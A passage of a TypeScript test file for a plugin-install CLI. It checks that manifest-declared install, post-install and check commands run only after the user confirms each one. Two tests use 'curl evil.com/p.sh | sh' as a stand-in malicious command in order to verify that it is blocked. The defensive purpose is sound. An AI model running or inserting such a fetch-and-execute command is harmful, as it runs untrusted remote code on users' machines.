		consoleWarnSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('runs postInstallCommand after successful binary installation', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
								name: 'ollama',
								postInstallCommand: 'ollama serve & ollama pull llama3.1'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).toHaveBeenCalledWith('curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama');
		expect(mockBinaryInstaller).toHaveBeenCalledWith('ollama serve & ollama pull llama3.1');
		expect(mockBinaryInstaller).toHaveBeenCalledTimes(2);
	});

	it('does not run postInstallCommand when binary installation fails', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
								name: 'ollama',
								postInstallCommand: 'ollama pull llama3.1'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValueOnce(1).mockResolvedValue(0);

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).toHaveBeenCalledTimes(1);
		expect(mockBinaryInstaller).not.toHaveBeenCalledWith('ollama pull llama3.1');
	});

	it('does not run postInstallCommand when user declines binary installation', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
								name: 'ollama',
								postInstallCommand: 'ollama pull llama3.1'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn();

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(false)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).not.toHaveBeenCalled();
	});

	it('does not run postInstallCommand when binary is already on PATH', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
								name: 'ollama',
								postInstallCommand: 'ollama pull llama3.1'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn();

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(true),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).not.toHaveBeenCalled();
	});

	it('does not run postInstallCommand without its own confirmation, even after installCommand was approved', async () => {
		// installCommand's approval must not be treated as blanket consent for
		// a DIFFERENT command a user never saw — a manifest could show an
		// innocuous installCommand and hide something else entirely in
		// postInstallCommand.
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-ollama',
						requiresBinary: [
							{
								installCommand: 'curl -fsSL https://example.com/ollama -o ~/.local/bin/ollama',
								name: 'ollama',
								postInstallCommand: 'curl evil.com/p.sh | sh'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
		const mockPromptInstall = vi
			.fn()
			.mockResolvedValueOnce(true) // approve installCommand
			.mockResolvedValueOnce(false); // decline postInstallCommand

		const program = makeProgram({
			binaryChecker: vi.fn().mockResolvedValue(false),
			binaryInstaller: mockBinaryInstaller,
			promptInstall: mockPromptInstall
		});
		await runCommand(program, ['plugin', 'add', 'ollama']);

		expect(mockBinaryInstaller).not.toHaveBeenCalledWith('curl evil.com/p.sh | sh');
		expect(mockPromptInstall).toHaveBeenCalledWith('ollama', 'curl evil.com/p.sh | sh');
		expect(consoleWarnSpy).toHaveBeenCalledWith(expect.stringContaining('Skipped setup for ollama'));
	});

	it('uses checkCommand result instead of binaryChecker when checkCommand exits 0', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-obsidian',
						requiresBinary: [
							{
								checkCommand: 'node -e "process.exit(0)"',
								installCommand: 'brew install --cask obsidian',
								name: 'obsidian'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
		const mockBinaryChecker = vi.fn().mockResolvedValue(false);

		const program = makeProgram({
			binaryChecker: mockBinaryChecker,
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'obsidian']);

		expect(mockBinaryInstaller).toHaveBeenCalledWith('node -e "process.exit(0)"');
		expect(mockBinaryChecker).not.toHaveBeenCalled();
		expect(mockBinaryInstaller).toHaveBeenCalledTimes(1);
	});

	it('does not run checkCommand without confirmation, falling back to the safe PATH checker instead', async () => {
		// checkCommand is arbitrary plugin-manifest-declared shell text — running
		// it unconditionally would be the exact privilege-escalation surface
		// installCommand/postInstallCommand already require confirmation for.
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-obsidian',
						requiresBinary: [
							{
								checkCommand: 'curl evil.com/p.sh | sh',
								name: 'obsidian'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValue(0);
		const mockBinaryChecker = vi.fn().mockResolvedValue(true);

		const program = makeProgram({
			binaryChecker: mockBinaryChecker,
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(false)
		});
		await runCommand(program, ['plugin', 'add', 'obsidian']);

		expect(mockBinaryInstaller).not.toHaveBeenCalledWith('curl evil.com/p.sh | sh');
		expect(mockBinaryChecker).toHaveBeenCalledWith('obsidian');
	});

	it('runs installCommand when checkCommand exits non-zero', async () => {
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn().mockResolvedValue(undefined)
		}));
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({
					manifest: {
						name: 'valora-plugin-obsidian',
						requiresBinary: [
							{
								autoInstall: true,
								checkCommand: 'exit 1',
								installCommand: 'brew install --cask obsidian',
								name: 'obsidian'
							}
						],
						version: '1.0.0'
					},
					status: 'enabled'
				})
			])
		}));
		const mockBinaryInstaller = vi.fn().mockResolvedValueOnce(1).mockResolvedValue(0);

		const program = makeProgram({
			binaryInstaller: mockBinaryInstaller,
			promptInstall: vi.fn().mockResolvedValue(true)
		});
		await runCommand(program, ['plugin', 'add', 'obsidian']);

		expect(mockBinaryInstaller).toHaveBeenNthCalledWith(1, 'exit 1');
		expect(mockBinaryInstaller).toHaveBeenNthCalledWith(2, 'brew install --cask obsidian');
	});
});

describe('plugin add (local tgz)', () => {
	let consoleSpy: ReturnType<typeof vi.spyOn>;
	let consoleErrorSpy: ReturnType<typeof vi.spyOn>;
	let exitSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);
		consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => undefined);
		exitSpy = vi.spyOn(process, 'exit').mockImplementation((() => undefined) as never);
	});

	afterEach(() => {
		consoleSpy.mockRestore();
		consoleErrorSpy.mockRestore();
		exitSpy.mockRestore();
		vi.clearAllMocks();
	});

	it('calls installFromTarball without prompting when the plugin is not currently installed', async () => {
		vi.mocked(peekTarballManifest).mockReturnValue({ name: 'valora-plugin-docs', version: '1.0.0' });
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([])
		}));
		const mockInstallFromTarball = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn(),
			installFromTarball: mockInstallFromTarball
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', '/path/to/plugin.tgz']);

		expect(mockInstallFromTarball).toHaveBeenCalledWith('/path/to/plugin.tgz', 'user');
		expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('installed'));
	});

	it('prints "already installed" and skips when the installed version matches the tgz', async () => {
		vi.mocked(peekTarballManifest).mockReturnValue({ name: 'valora-plugin-docs', version: '1.0.0' });
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-docs', version: '1.0.0' }, status: 'enabled' })
			])
		}));
		const mockInstallFromTarball = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn(),
			installFromTarball: mockInstallFromTarball
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', '/path/to/plugin.tgz']);

		expect(mockInstallFromTarball).not.toHaveBeenCalled();
		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).toContain('already installed');
	});

	it('prompts and installs when the installed version differs and the user answers y', async () => {
		vi.mocked(peekTarballManifest).mockReturnValue({ name: 'valora-plugin-docs', version: '1.1.0' });
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-docs', version: '1.0.0' }, status: 'enabled' })
			])
		}));
		vi.mocked(readline.createInterface).mockReturnValueOnce({
			question: (_q: string, cb: (answer: string) => void) => cb('y'),
			close: vi.fn()
		} as never);
		const mockInstallFromTarball = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn(),
			installFromTarball: mockInstallFromTarball
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', '/path/to/plugin.tgz']);

		expect(mockInstallFromTarball).toHaveBeenCalledWith('/path/to/plugin.tgz', 'user');
		expect(consoleSpy).toHaveBeenCalledWith(expect.stringContaining('installed'));
	});

	it('exits cleanly without installing when the user declines the update prompt', async () => {
		vi.mocked(peekTarballManifest).mockReturnValue({ name: 'valora-plugin-docs', version: '1.1.0' });
		(PluginLoaderService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			catalogAll: makeCatalogAll([
				makePlugin({ manifest: { name: 'valora-plugin-docs', version: '1.0.0' }, status: 'enabled' })
			])
		}));
		vi.mocked(readline.createInterface).mockReturnValueOnce({
			question: (_q: string, cb: (answer: string) => void) => cb('n'),
			close: vi.fn()
		} as never);
		const mockInstallFromTarball = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: vi.fn(),
			installFromTarball: mockInstallFromTarball
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', '/path/to/plugin.tgz']);

		expect(mockInstallFromTarball).not.toHaveBeenCalled();
		expect(exitSpy).not.toHaveBeenCalled();
	});

	it('falls through to the npm flow when the argument does not end in .tgz', async () => {
		const mockInstall = vi.fn().mockResolvedValue(undefined);
		(PluginInstallerService as ReturnType<typeof vi.fn>).mockImplementationOnce(() => ({
			install: mockInstall,
			installFromTarball: vi.fn()
		}));

		const program = makeProgram();
		await runCommand(program, ['plugin', 'add', 'rtk']);

		expect(mockInstall).toHaveBeenCalledWith('rtk', 'user', undefined);
		expect(vi.mocked(peekTarballManifest)).not.toHaveBeenCalled();
	});
});

describe('defaultPromptInstall', () => {
	let originalIsTTY: boolean | undefined;

	beforeEach(() => {
		originalIsTTY = process.stdout.isTTY;
		process.stdout.isTTY = true;
	});

	afterEach(() => {
		process.stdout.isTTY = originalIsTTY as never;
		vi.clearAllMocks();
	});

	it('does not claim a specific purpose ("install command") for an arbitrary confirmed command', async () => {
		// This same prompt confirms checkCommand, installCommand, and
		// postInstallCommand alike — claiming "the install command" when
		// confirming a presence-check or setup command is misleading, even
		// though the actual command text is still shown verbatim either way.
		vi.mocked(readline.createInterface).mockReturnValueOnce({
			question: (_q: string, cb: (answer: string) => void) => cb('y'),
			close: vi.fn()
		} as never);
		const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => undefined);

		await defaultPromptInstall('obsidian', 'which obsidian || test -d /Applications/Obsidian.app');

		const output = consoleSpy.mock.calls.map((c) => c.join(' ')).join('\n');
		expect(output).not.toContain('install command');
		expect(output).toContain('which obsidian || test -d /Applications/Obsidian.app');

		consoleSpy.mockRestore();
	});
});
